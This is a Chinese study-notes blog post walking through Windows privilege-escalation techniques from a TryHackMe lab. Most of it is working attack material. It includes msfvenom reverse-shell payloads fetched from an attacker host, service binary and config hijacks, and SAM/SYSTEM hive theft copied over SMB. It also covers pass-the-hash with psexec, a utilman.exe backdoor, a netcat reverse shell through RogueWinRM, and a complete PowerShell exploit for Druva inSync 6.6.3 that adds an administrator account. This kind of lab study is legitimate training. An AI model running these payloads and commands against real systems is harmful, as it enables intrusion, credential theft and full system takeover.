<p>但默认情况下，大多数服务可执行文件将安装在 <code>C：\Program Files</code> 或 <code>C：\Program Files （x86）</code> 下，非特权用户无法写入。这可以防止任何易受攻击的服务被利用。此规则也有例外： - 某些安装程序更改了已安装文件夹的权限，使服务容易受到攻击。- 管理员可能决定在非默认路径中安装服务二进制文件。如果这样的路径是全局可写的，则可以利用此漏洞。</p>
<p>比如靶场中这个例子：<br><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250424114048.png"><br><code>BUILTIN\\Users</code> 组具有 <strong>AD</strong> 和 <strong>WD</strong> 权限，允许用户分别创建子目录和文件<br>生成个马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.21.170.43 LPORT=404 -f exe-service -o rev-svc2.exe</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250424122725.png"><br>在靶机上把马下下来，然后替换服务文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.21.170.43:8080/rev-svc2.exe -O rev-svc2.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls C:\MyPrograms\Disk.exe /grant Everyone:F</span><br></pre></td></tr></table></figure>

<p>然后重启服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc stop &quot;disk sorter enterprise&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start &quot;disk sorter enterprise&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250424123247.png"></p>
<h2 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h2><p>如果服务 DACL（而不是服务的可执行 DACL）允许当前用户修改服务的配置，那么将能够重新配置该服务。这将允许该服务指向需要的任何可执行文件，并使用任何帐户运行它，包括 SYSTEM 本身<br>可用<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk">AccessChk</a>（本地放.tools文件夹了）从命令行检查服务 DACL<br>运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./accesschk</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>-a</code></td>
<td>名称为 Windows 帐户权限。指定 <code>*</code> 可显示分配给该用户的所有权限。注意：当指定具体权限时，仅显示直接被分配该权限的组和帐户。</td>
</tr>
<tr>
<td><code>-c</code></td>
<td>名称为 Windows 服务，例如 <code>ssdpsrv</code>。指定 <code>*</code> 可显示所有服务；使用 <code>scmanager</code> 可检查服务控制管理器的安全性。</td>
</tr>
<tr>
<td><code>-d</code></td>
<td>仅处理目录或顶级注册表键。</td>
</tr>
<tr>
<td><code>-e</code></td>
<td>仅显示显式设置的完整性级别（仅限 Windows Vista 及更高版本）。</td>
</tr>
<tr>
<td><code>-f</code></td>
<td>若与 <code>-p</code> 连用，显示完整的进程令牌信息（包括组和权限）；否则将后续参数视为逗号分隔的帐户列表，用于从输出中过滤。</td>
</tr>
<tr>
<td><code>-h</code></td>
<td>名称为文件或打印机共享。指定 <code>*</code> 可显示所有共享。</td>
</tr>
<tr>
<td><code>-i</code></td>
<td>在转储完整访问控制列表时，忽略仅具有继承 ACE（访问控制条目）的对象。</td>
</tr>
<tr>
<td><code>-k</code></td>
<td>名称为注册表键，例如 <code>hklm\software</code>。</td>
</tr>
<tr>
<td><code>-l</code></td>
<td>显示完整安全描述符。添加 <code>-i</code> 可忽略继承的访问控制条目。</td>
</tr>
<tr>
<td><code>-n</code></td>
<td>仅显示无任何访问权限的对象。</td>
</tr>
<tr>
<td><code>-o</code></td>
<td>名称为对象管理器命名空间中的对象（默认为 <code>\</code> 根目录）。要查看目录内容，可在名称后加 <code>\</code> 或添加 <code>-s</code>；添加 <code>-t &lt;类型&gt;</code>（如 <code>section</code>）可仅查看指定类型的对象。</td>
</tr>
<tr>
<td><code>-p</code></td>
<td>名称为进程名或 PID（如 <code>cmd.exe</code>），指定 <code>*</code> 可显示所有进程。添加 <code>-f</code> 可显示完整进程令牌信息（包括组和权限）；添加 <code>-t</code> 可显示线程。</td>
</tr>
<tr>
<td><code>-nobanner</code></td>
<td>不显示启动横幅和版权信息。</td>
</tr>
<tr>
<td><code>-r</code></td>
<td>仅显示具有读取权限的对象。</td>
</tr>
<tr>
<td><code>-s</code></td>
<td>递归处理子目录或子对象。</td>
</tr>
<tr>
<td><code>-t</code></td>
<td>对象类型过滤，如 <code>&quot;section&quot;</code>。</td>
</tr>
<tr>
<td><code>-u</code></td>
<td>抑制错误输出。</td>
</tr>
<tr>
<td><code>-v</code></td>
<td>详细模式（包括 Windows Vista 及更高版本的完整性级别信息）。</td>
</tr>
<tr>
<td><code>-w</code></td>
<td>仅显示具有写入权限的对象。</td>
</tr>
<tr>
<td>比如要检查<code>thmservice</code>的DACL</td>
<td></td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk64.exe -qlc thmservice</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250425094148.png"><br>主要注意的是<strong>BUILTIN\Users</strong> 配置，有<strong>SERVICE_ALL_ACCESS</strong> 权限就代表任何用户都可以重新配置服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.21.170.43 LPORT=404 -f exe-service -o aaa.exe</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250425094443.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.21.170.43:8080/aaa.exe -o aaa.exe</span><br></pre></td></tr></table></figure>

<p>向 Everyone 授予执行有效负载的权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls aaa.exe /grant Everyone:F</span><br></pre></td></tr></table></figure>

<p>更改服务的关联可执行文件和帐户(注意等号后面的空格)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc config THMService binPath= &quot;C:\tools\AccessChk\aaa.exe&quot; obj= LocalSystem</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250425094829.png"><br>重启服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc stop THMService</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start THMService</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250425094937.png"></p>
<h1 id="滥用危险权限"><a href="#滥用危险权限" class="headerlink" title="滥用危险权限"></a>滥用危险权限</h1><p>查看权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250425095342.png"><br>可以在 <a target="_blank" rel="noopener" href="https://github.com/gtworek/Priv2Admin">Priv2Admin</a> Github 项目上找到可利用权限的完整列表<br>最常见的特权的一些基本利用方式</p>
<h2 id="SeBackup-SeRestore"><a href="#SeBackup-SeRestore" class="headerlink" title="SeBackup &#x2F; SeRestore"></a>SeBackup &#x2F; SeRestore</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>SeBackup 和 SeRestore 权限允许用户读取和写入系统中的任何文件，而忽略任何现有的 DACL。此权限背后的想法是允许某些用户从系统执行备份，而无需完全管理权限<br>拥有此权限，攻击者可以使用多种技术轻松提升系统的权限。比如查看的配置包括复制 SAM 和 SYSTEM 注册表配置单元以提取本地管理员的密码哈希</p>
<h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p>开个远程桌面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /u:THMBackup /p:CopyMaster555 /v:10.10.102.232 /dynamic-resolution +clipboard</span><br></pre></td></tr></table></figure>

<p>以管理员权限打开控制台<br><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250425101739.png"><br>备份 SAM 和 SYSTEM 哈希值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system C:\Users\THMBackup\system.hive</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam C:\Users\THMBackup\sam.hive</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250425101848.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 smbserver.py -smb2support -debug -username THMBackup -password CopyMaster555 a /tmp/share</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250425133553.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\Users\THMBackup\sam.hive \\10.10.204.24\public\</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\Users\THMBackup\system.hive \\10.10.204.24\public\</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250425142826.png"><br>这步在<code>attackbox</code>中成功了，但是我本机实验没成功，感觉应该是做了相应的安全策略<br><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250425142922.png"><br>拿到哈希值之后就可以使用 impacket 检索用户的密码哈希值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250425143128.png"><br>接下来使用 Administrator 的哈希来执行 Pass-the-Hash 攻击，并以 SYSTEM 权限访问目标计算机</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.224.76</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250425144036.png"></p>
<h2 id="SeTakeOwnership"><a href="#SeTakeOwnership" class="headerlink" title="SeTakeOwnership"></a>SeTakeOwnership</h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>这个思路是滥用 <code>utilman.exe</code> 来提升权限。Utilman 是一个内置的 Windows 应用程序，用于在锁定屏幕期间提供 Ease of Access 选项<br>由于 Utilman 是以 SYSTEM 权限运行的，当可以拥有任何文件的所有权，就可通过替换它来提权</p>
<h3 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h3><p>获取utilman.exe的所有权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">takeown /f C:\Windows\System32\Utilman.exe</span><br></pre></td></tr></table></figure>

<p>授予用户对 utilman.exe 的完全权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">改为everyone应该也行</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后可将 utilman.exe 替换成 cmd.exe </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy cmd.exe utilman.exe</span><br></pre></td></tr></table></figure>

<p>要触发 utilman，就要从开始按钮锁定屏幕<br><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250425145134.png"><br>然后点一下<code>Ease of Access</code>按钮，就能启动一个管理员权限的cmd<br><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250425145243.png"></p>
<h2 id="SeImpersonate-SeAssignPrimaryToken"><a href="#SeImpersonate-SeAssignPrimaryToken" class="headerlink" title="SeImpersonate &#x2F; SeAssignPrimaryToken"></a>SeImpersonate &#x2F; SeAssignPrimaryToken</h2><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>这些权限允许进程模拟其他用户并代表他们执行<br>在 Windows 系统中，您会发现 LOCAL SERVICE 和 NETWORK SERVICE ACCOUNTS 已经具有此类权限。由于这些帐户用于使用受限帐户生成服务，因此在服务需要时允许它们模拟连接用户是有意义的<br>要使用此类帐户提升权限，攻击者需要满足以下条件：</p>
<ol>
<li>生成一个进程，以便用户可以连接该进程并对其进行身份验证，以便进行模拟</li>
<li>找到一种方法来强制特权用户连接并验证生成的恶意进程。</li>
</ol>
<h3 id="实操（RogueWinRM-漏洞）"><a href="#实操（RogueWinRM-漏洞）" class="headerlink" title="实操（RogueWinRM 漏洞）"></a>实操（RogueWinRM 漏洞）</h3><p>假设已经传了webshell，拿权了<br>先看权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250425150446.png"><br>拥有SeImpersonate特权，符合利用标准<br>然后传个<code>RogueWinRM</code>的exp上去<br>直接弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\tools\RogueWinRM\RogueWinRM.exe -p &quot;C:\tools\nc64.exe&quot; -a &quot;-e cmd.exe 10.10.204.24 404&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">就是指定用最高权限运行nc弹shell</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250425151054.png"><br><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250425151115.png"></p>
<h1 id="滥用易受攻击的软件"><a href="#滥用易受攻击的软件" class="headerlink" title="滥用易受攻击的软件"></a>滥用易受攻击的软件</h1><h2 id="未修补的软件"><a href="#未修补的软件" class="headerlink" title="未修补的软件"></a>未修补的软件</h2><p>查看已安装的软件版本信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version,vendor</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250425151754.png"><br>挺耗时间的<br>显示结果以后可在<a target="_blank" rel="noopener" href="https://www.exploit-db.com/">exploit-db</a>、<a target="_blank" rel="noopener" href="https://packetstormsecurity.com/">packet storm</a>或Google等网站上在线搜索已安装软件上的现有漏洞</p>
<h2 id="案例研究：Druva-inSync-6-6-3"><a href="#案例研究：Druva-inSync-6-6-3" class="headerlink" title="案例研究：Druva inSync 6.6.3"></a>案例研究：Druva inSync 6.6.3</h2><p>目标服务器正在运行 Druva inSync 6.6.3，据 <a target="_blank" rel="noopener" href="https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/">Matteo Malvica</a> 报告，该服务器容易受到权限提升的影响<br><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/4be0e910fad08acbcdc0f1c30086d1f5.png"><br>该软件容易受到攻击，因为它在端口 6064 上运行具有 SYSTEM 权限的 RPC（远程过程调用）服务器，只能从 localhost 访问<br>在 Druva inSync 的情况下，端口 6064 上公开的程序之一（特别是程序编号 5）允许任何人请求执行任何命令。由于 RPC 服务器以 SYSTEM 身份运行，因此任何命令都以 SYSTEM 权限执行<br>漏洞大致原理就是：程序决定检查执行的命令是否以字符串 <code>C：\ProgramData\Druva\inSync4\</code> 开头，允许的二进制文件应该在其中。但后来证明这还不够，因为您可以简单地进行路径遍历攻击来绕过这种控制。假设你要执行 <code>C：\Windows\System32\cmd.exe</code>，它不在允许的路径中;您可以简单地要求服务器运行 <code>C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe</code> ，这将成功绕过检查<br>直接打exp就行（powershell运行）<br>exp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ErrorActionPreference = &quot;Stop&quot;</span><br><span class="line"></span><br><span class="line">$cmd = &quot;net user pwnd SimplePass123 /add &amp; net localgroup administrators pwnd /add&quot;</span><br><span class="line"></span><br><span class="line">$s = New-Object System.Net.Sockets.Socket(</span><br><span class="line">    [System.Net.Sockets.AddressFamily]::InterNetwork,</span><br><span class="line">    [System.Net.Sockets.SocketType]::Stream,</span><br><span class="line">    [System.Net.Sockets.ProtocolType]::Tcp</span><br><span class="line">)</span><br><span class="line">$s.Connect(&quot;127.0.0.1&quot;, 6064)</span><br><span class="line"></span><br><span class="line">$header = [System.Text.Encoding]::UTF8.GetBytes(&quot;inSync PHC RPCW[v0002]&quot;)</span><br><span class="line">$rpcType = [System.Text.Encoding]::UTF8.GetBytes(&quot;$([char]0x0005)`0`0`0&quot;)</span><br><span class="line">$command = [System.Text.Encoding]::Unicode.GetBytes(&quot;C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd&quot;);</span><br><span class="line">$length = [System.BitConverter]::GetBytes($command.Length);</span><br><span class="line"></span><br><span class="line">$s.Send($header)</span><br><span class="line">$s.Send($rpcType)</span><br><span class="line">$s.Send($length)</span><br><span class="line">$s.Send($command)</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250425152754.png"><br>验证是否成功（看在不在管理员组就行）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user pwnd</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250425152841.png"><br>然后就是以管理员身份启动cmd，记得换用户<br><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250425153058.png"><br><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250425153236.png"></p>
<h1 id="自动化脚本"><a href="#自动化脚本" class="headerlink" title="自动化脚本"></a>自动化脚本</h1><h2 id="豌豆"><a href="#豌豆" class="headerlink" title="豌豆"></a>豌豆</h2><p>比如好用的豌豆，linux系统的林豌豆就很舒适，windows就用<a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS">win豌豆</a></p>
<h2 id="PrivescCheck"><a href="#PrivescCheck" class="headerlink" title="PrivescCheck"></a>PrivescCheck</h2><p><a target="_blank" rel="noopener" href="https://github.com/itm4n/PrivescCheck">PrivescCheck</a>是一个 PowerShell 脚本，用于搜索目标系统上的常见权限提升。它提供了 WinPEAS 的替代方案，而无需执行二进制文件<br><strong>运行前需要绕过执行策略限制</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy Bypass -Scope process -Forc</span><br></pre></td></tr></table></figure>

<h2 id="WES-NG"><a href="#WES-NG" class="headerlink" title="WES-NG"></a><a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">WES-NG</a></h2><p>下载后，先更新下漏洞库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wes.py --update</span><br></pre></td></tr></table></figure>

<p>运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wes.py</span><br></pre></td></tr></table></figure>

<p>导出结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo &gt; 1.txt</span><br></pre></td></tr></table></figure>

<p>然后漏洞扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wes.py 1.txt</span><br></pre></td></tr></table></figure>

<p>整个过程看官方演示👇<br><img src="https://raw.githubusercontent.com/bitsadmin/wesng/master/demo.gif"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://lan1oc.co">lan1oc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://lan1oc.co/2025/04/22/THM/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91[THM]Windows%20Privilege%20Escalation(windows%E6%8F%90%E6%9D%83)/">http://lan1oc.co/2025/04/22/THM/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91[THM]Windows%20Privilege%20Escalation(windows%E6%8F%90%E6%9D%83)/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://lan1oc.co" target="_blank">lan1ocのblog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/THM%E8%AE%B0%E5%BD%95/">THM记录</a></div><div class="post-share"><div class="social-share" data-image="/img/cover/1.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/04/20/THM/%5BTHM%5DJohn%20the%20Ripper%20The%20Basics/" title="[THM]John the Ripper: The Basics"><img class="cover" src="/img/cover/2.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">[THM]John the Ripper: The Basics</div></div><div class="info-2"><div class="info-item-1">下载安装git下来然后看文档 1cat ./doc/INSTALL-UBUNTU  然后跟着做就行 1cd src  1234./configure --disable-openmp &amp;&amp; make -s clean &amp;&amp; make -sj4mv ../run/john ../run/john-non-omp ./configure CPPFLAGS=&#x27;-DOMP_FALLBACK -DOMP_FALLBACK_BINARY=&quot;\&quot;john-non-omp\&quot;&quot;&#x27;make -s clean &amp;&amp; make -sj4  测试：在john/run 1./john --test=0   破解基本哈希基本使用自动破解示例命令 1john --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt  格式特定破解确定哈希值有时，John 可能不会与自动识别和加载哈希值很好地配合，可以使用一个名为...</div></div></div></a><a class="pagination-related" href="/2025/04/24/THM/%5BTHM%5DJr%20Penetration%20Tester%20Certificate/" title="[THM]Jr Penetration Tester Certificate"><img class="cover" src="/img/cover/3.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">[THM]Jr Penetration Tester Certificate</div></div><div class="info-2"><div class="info-item-1">磨洋工磨了这么久终于是全打完了 </div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/05/28/THM/%5BTHM%5DWeb%20Application%20Pentesting---Authentication%20%E8%AE%A4%E8%AF%81/" title="[THM]Web Application Pentesting---Authentication  认证"><img class="cover" src="/img/cover/4.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-28</div><div class="info-item-2">[THM]Web Application Pentesting---Authentication  认证</div></div><div class="info-2"><div class="info-item-1">基础sessioncookie属性Secure - 向浏览器指示 Cookie 只能通过经过验证的 HTTPS 通道传输。如果存在证书错误或使用 HTTP，则不会传输 Cookie 值HTTPOnly - 向浏览器指示客户端 JavaScript 可能无法读取 Cookie 值Expire - 向浏览器指示 Cookie 值何时不再有效，应将其删除SameSite - 向浏览器指示是否可以在跨站点请求中传输 Cookie，以帮助防止 CSRF 攻击 tokenToken-Based Session Management最常见的令牌类型之一是 JSON Web 令牌 （JWT），一般形式 1Authorization: Bearer &lt;token&gt;  以前的盲点浏览器中不仅仅要注意cookie，还要注意本地存储的 JWT它没有使用浏览器的自动 cookie 管理功能，而是依赖于客户端代码来完成该过程。身份验证后，Web 应用程序会在请求正文中提供令牌。然后使用客户端 JavaScript 代码，此令牌将存储在浏览器的 LocalStorage...</div></div></div></a><a class="pagination-related" href="/2025/04/11/THM/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%5BTHM%5DLinux%20Privilege%20Escalation(linux%E6%8F%90%E6%9D%83)/" title="【学习笔记】[THM]Linux Privilege Escalation(linux提权)"><img class="cover" src="/img/cover/3.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-11</div><div class="info-item-2">【学习笔记】[THM]Linux Privilege Escalation(linux提权)</div></div><div class="info-2"><div class="info-item-1">信息收集假设已经拿下权限，那就先收集下这台机器的信息 主机名1hostname   系统信息1uname -a   内核版本和其他数据的信息1cat /proc/version   &#x2F;etc&#x2F;issue 系统版本1cat /etc/issue   看进程1234ps -A：查看所有正在运行的进程ps axjf：查看进程树（请参阅下面的树结构，直到运行 ps axjf）ps aux：aux 选项将显示所有用户的进程 （a），显示启动进程的用户 （u），并显示未连接到终端的进程 （x）。查看 ps aux 命令输出，我们可以更好地了解系统和潜在漏洞。  一般直接用 1ps -aux  看环境变量1env  重点看path变量PATH 变量可能具有编译器或脚本语言（例如 Python），可用于在目标系统上运行代码或用于权限提升。 看允许用户使用 root 权限运行哪些命令(鸡肋，要密码)1sudo -l  看用户组1id  也可看其他用户 1id root   &#x2F;etc&#x2F;passwd1cat...</div></div></div></a><a class="pagination-related" 